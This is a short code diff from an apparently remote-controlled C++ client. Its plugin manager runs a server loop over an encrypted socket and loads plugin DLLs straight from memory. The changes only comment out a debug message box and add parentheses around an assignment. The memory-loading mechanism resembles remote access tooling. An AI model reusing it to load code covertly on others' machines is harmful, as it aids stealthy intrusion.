@@ -33,7 +33,7 @@ uint PluginManager::run(SOCKET hConexion, HCRYPTKEY hKey, LoaderFunTable &lFunc)
 
     this->lFunc = &lFunc;
 
-    MessageBoxA(0, "PluginManager::run", "DLL Message", MB_OK | MB_ICONINFORMATION);
+    //MessageBoxA(0, "PluginManager::run", "DLL Message", MB_OK | MB_ICONINFORMATION);
     return client.serverLoop();
 }
 
@@ -62,7 +62,7 @@ bool PluginManager::loadPlugin(RPEP_LOAD_PLUGIN* pluginModule){
         printf("Cargando plugin....\n");
         newPlugin = new plugin();
         //Cargamos el plugin
-        if(newPlugin->hModule = hModule = lFunc->LoadLibraryFromMemoy(pluginModule->PluginModule,"")){
+        if((newPlugin->hModule = hModule = lFunc->LoadLibraryFromMemoy(pluginModule->PluginModule,""))){
             //Buscamos las funciones exportadas
             getInterface = (pgetInterface)GetProcAddress(hModule,"getInterface");
             if((newPlugin->plugInterface = getInterface())){
